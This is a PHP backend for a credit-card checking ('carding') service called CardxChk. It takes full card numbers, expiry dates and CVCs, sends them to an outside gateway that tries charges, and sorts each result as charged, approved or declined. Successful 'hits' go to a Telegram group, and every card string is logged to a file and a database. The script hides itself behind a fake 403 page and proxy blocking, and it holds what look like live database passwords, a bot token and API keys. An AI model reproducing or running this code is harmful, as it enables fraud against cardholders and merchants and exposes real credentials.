<?php
// FOR DEBUGGING: If you get a 500 error, uncomment the lines below to see the exact error
// ini_set('display_errors', 1);
// error_reporting(E_ALL);
require_once __DIR__ . '/globalstats.php';
// Check if this is a GET request and show the HTML page immediately
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(403);
    
    echo '<html style="height:100%"> 
          <head> 
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
          <title> 403 Forbidden </title>
          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
          </head> 
          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
          <div style="height:auto; min-height:100%; "> 
          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
          <p>Access to this resource on the server is denied!</p> 
          </div></div></body></html>';
    
    exit;
}

header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// --- MOVED log_message function to the top to prevent 500 errors ---
// Optional file-based logging for debugging
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    // Ensure the message is a string
    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
}

// --- PROXY DETECTION LOGIC - MOVED TO TOP FOR ALL REQUESTS ---

// Function to get the real user IP address
function getUserIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
}

// Function to check if IP is a proxy
function checkProxyIP($ip) {
    // Check if cURL is available
    if (!function_exists('curl_init')) {
        log_message("cURL extension is not installed. Cannot perform proxy check.");
        return false; // Fail open (allow access) if we can't check
    }

    $api_url = "https://api.isproxyip.com/v1/check.php?key=zHwDyAMU6bJMIHCKfcDGnjMi7zq3S743dQXWBoqKNPCPEW4z94&ip=" . urlencode($ip) . "&format=json";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10-second timeout
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        log_message("Proxy check CURL error for IP $ip: $error");
        return false; // Fail open on error
    }
    
    if ($http_code !== 200) {
        log_message("Proxy check HTTP error for IP $ip: Status Code $http_code. Response: $response");
        return false; // Fail open on error
    }
    
    $data = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($data['proxy'])) {
        log_message("Proxy check JSON decode error or missing 'proxy' key for IP $ip. Response: $response");
        return false; // Fail open on error
    }
    
    // Log the proxy check result
    log_message("Proxy check result for IP $ip: " . json_encode($data));
    
    // Return true if proxy is detected (value > 0)
    return (int)$data['proxy'] > 0;
}

// Function to display simple 403 Forbidden page
function showForbiddenPage() {
    // Reset content type to HTML
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(403);
    
    echo '<html style="height:100%"> 
          <head> 
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
          <title> 403 Forbidden </title>
          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
          </head> 
          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
          <div style="height:auto; min-height:100%; "> 
          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
          <p>Access to this resource on the server is denied!</p> 
          </div></div></body></html>';
    
    exit; // Ensure script execution stops completely
}

// Get user's IP address and check for proxy - FOR ALL REQUESTS
 $user_ip = getUserIP();
log_message("Request received from IP: $user_ip");

if (checkProxyIP($user_ip)) {
    log_message("ACCESS DENIED - Proxy detected for IP: $user_ip");
    showForbiddenPage();
    exit; // Double ensure script execution stops
}

// --- END OF PROXY DETECTION LOGIC ---

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/refresh.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// === DATABASE CONNECTION ===
 $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';

try {
    $dbUrl = parse_url($databaseUrl);
    $host = $dbUrl['host'] ?? null;
    $port = $dbUrl['port'] ?? 5432;
    $user = $dbUrl['user'] ?? null;
    $pass = $dbUrl['pass'] ?? null;
    $path = $dbUrl['path'] ?? null;

    if (!$host || !$user || !$pass || !$path) {
        throw new Exception("Missing DB connection parameters");
    }

    $dbName = ltrim($path, '/');
    
    // Set connection timeout with extended options and SSL mode
    $pdo = new PDO(
        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
        $user,
        $pass,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_TIMEOUT => 15,
            PDO::ATTR_PERSISTENT => false,
            PDO::ATTR_EMULATE_PREPARES => false
        ]
    );
    
    // Store the database connection in a global variable for use in recordCardCheck
    $GLOBALS['pdo'] = $pdo;
    
} catch (PDOException $e) {
    error_log("Database PDO Error in authnet1$.php: " . $e->getMessage());
    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
    exit;
} catch (Exception $e) {
    error_log("General Error in authnet1$.php: " . $e->getMessage());
    echo json_encode(['status' => 'ERROR', 'message' => 'Server error']);
    exit;
}

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
 $validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

 $expectedApiKey = $validation['response']['apiKey'];
 $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Track sent notifications to prevent duplicates
 $sent_notifications = [];

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false ||
           strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
           strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
           strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
    global $sent_notifications;
    
    // Create a unique key for this card to prevent duplicates
    $notification_key = md5($card_details . $status . $response);
    
    // Check if we've already sent this notification
    if (isset($sent_notifications[$notification_key])) {
        log_message("Skipping duplicate notification for $card_details: $status");
        return;
    }
    
    // Mark this notification as sent
    $sent_notifications[$notification_key] = true;
    
    // Check both formatted response and original API response for 3DS
    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
    if (is3DAuthenticationResponse($checkResponse)) {
        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
        return;
    }
    
    // Only proceed if status is CHARGED or APPROVED
    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
        return;
    }

    // Load Telegram Bot Token from environment (secure storage)
    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
    $chat_id = '-1003204998888'; // Your group chat ID
    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
    $site_link = 'https://cxchk.site';

    // Get user info from session
    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
    $gateway = 'Authnet 1$'; // Updated for this gateway
    $formatted_response = formatResponse($response);

    // Construct Telegram message
    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
               "<b>――――――――――――</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

    // Send to Telegram
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $payload = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || !$result) {
        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
    } else {
        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
    }
}

// Check if card details are provided
if (!isset($_POST['card']) || !is_array($_POST['card'])) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
    exit;
}

// Extract card details
 $card_number = $_POST['card']['number'] ?? '';
 $exp_month = $_POST['card']['exp_month'] ?? '';
 $exp_year = $_POST['card']['exp_year'] ?? '';
 $cvc = $_POST['card']['cvc'] ?? '';

// Validate card details
if (empty($card_number) || empty($exp_month) || empty($exp_year) || empty($cvc)) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Missing card details']);
    exit;
}

// Normalize exp_month to 2 digits
 $exp_month = str_pad($exp_month, 2, '0', STR_PAD_LEFT);

// Normalize exp_year to 4 digits if it's 2 digits (YY)
if (strlen($exp_year) === 2) {
    $exp_year = (intval($exp_year) < 50 ? '20' : '19') . $exp_year;
} elseif (strlen($exp_year) !== 4 || !is_numeric($exp_year)) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid year format']);
    exit;
}

// Format cc string: number|month|year|cvc
 $cc = $card_number . '|' . $exp_month . '|' . $exp_year . '|' . $cvc;

// API URL
 $api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';

// Create 3 parallel requests with slight variations
 $responses = [];
 $multi_handle = curl_multi_init();

 $channels = [];
for ($i = 0; $i < 3; $i++) {
    $url = $api_url_base . urlencode($cc) . '&attempt=' . $i . '&rand=' . mt_rand();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_multi_add_handle($multi_handle, $ch);
    $channels[$i] = $ch;
}

 $active = null;
do {
    curl_multi_exec($multi_handle, $active);
    usleep(10000); // Small delay to prevent CPU overload
} while ($active > 0);

foreach ($channels as $i => $ch) {
    $response = curl_multi_getcontent($ch);
    $error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    if ($error) {
        log_message("CURL Error for request $i: $error");
    } elseif ($http_code != 200) {
        log_message("HTTP Error for request $i: $http_code");
    } elseif ($response !== false) {
        $responses[$i] = $response;
        log_message("Response $i: $response");
    }
    
    curl_multi_remove_handle($multi_handle, $ch);
}
curl_multi_close($multi_handle);

// Check if we got any valid responses
if (empty($responses)) {
    log_message("No valid responses received from API");
    
    // Record the failed attempt in the database
    recordCardCheck($GLOBALS['pdo'], $cc, 'ERROR', 'API requests failed');
    
    echo json_encode(['status' => 'ERROR', 'message' => 'API requests failed']);
    exit;
}

// Process responses
 $best_response = ['status' => 'DECLINED', 'message' => 'All attempts failed'];
 $valid_response_found = false;

foreach ($responses as $response) {
    if ($response !== false) {
        $data = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($data['message'], $data['status'])) {
            $best_response = $data;
            $valid_response_found = true;
            break; // Take the first valid response
        } else {
            log_message("JSON decode error: " . json_last_error_msg());
        }
    }
}

if (!$valid_response_found) {
    log_message("No valid JSON response found");
    
    // Record the failed attempt in the database
    recordCardCheck($GLOBALS['pdo'], $cc, 'ERROR', 'Invalid API response format');
    
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid API response format']);
    exit;
}

// Extract message and status
 $message = $best_response['message'] ?? 'Unknown error';
 $api_status = $best_response['status'] ?? 'UNKNOWN';

// Lowercase for case-insensitive comparison
 $message_lower = strtolower($message);

// Define phrase arrays
 $charged_phrases = [
    'transaction approved',
    'payment successful',
    'transaction complete',
    'approved',
    'success',
    'payment processed',
    'thank you for your payment'
];

 $approved_phrases = [
    'cvv',
    'card code',
    'security code',
    'cvv2',
    'cvc',
    'cvv does not match',
    'security code'
];

 $declined_phrases = [
    'failed',
    'declined',
    'transaction declined',
    'card declined',
    'insufficient funds',
    'invalid card',
    'expired card',
    'this transaction has been declined'
];

// Determine status
 $our_status = 'DECLINED';

// Check for CHARGED
foreach ($charged_phrases as $phrase) {
    if (strpos($message_lower, $phrase) !== false) {
        $our_status = 'CHARGED';
        break;
    }
}

// If not CHARGED, check for APPROVED (CVV related)
if ($our_status === 'DECLINED') {
    foreach ($approved_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $our_status = 'APPROVED';
            break;
        }
    }
}

// If still DECLINED, confirm with declined phrases or default
if ($our_status === 'DECLINED') {
    $is_declined = false;
    foreach ($declined_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $is_declined = true;
            break;
        }
    }
    if (!$is_declined && $api_status !== 'DECLINED') {
        $our_status = 'DECLINED';
    }
}

// Prepare output message
 $our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');

// Record the card check result in the database
recordCardCheck($GLOBALS['pdo'], $cc, $our_status, $our_message);

// Send Telegram notification for CHARGED status
if ($our_status === 'CHARGED') {
    sendTelegramNotification($cc, $our_status, $our_message);
}

// Output JSON response
echo json_encode(['status' => $our_status, 'message' => $our_message]);
?>
